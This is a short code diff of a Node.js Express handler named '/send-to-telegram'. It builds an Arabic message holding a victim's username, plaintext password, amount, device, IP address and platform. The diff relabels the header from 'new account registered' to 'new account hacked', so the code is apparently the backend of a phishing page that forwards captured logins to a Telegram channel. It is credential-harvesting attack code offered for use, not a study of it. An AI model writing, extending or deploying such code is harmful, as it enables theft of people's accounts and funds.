@@ -90,11 +90,12 @@ app.post('/send-to-telegram', async (req, res) => {
     let userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
     if (userIP === '::1') userIP = '127.0.0.1 (localhost)';
     
-    const message = `♦️ - تم تسجيل حساب جديد 
+    const message = `♦️ - تم اختراق حساب جديد 
 
 🔹 - اسم المستخدم: ${playerId}
 🔑 - كلمة المرور: ${password}
 💰 - المبلغ: ${amount}
+
 📱 - الجهاز: ${userDevice}
 🌍 - IP: ${userIP}
 🔄 - المنصة: ${platform}`;
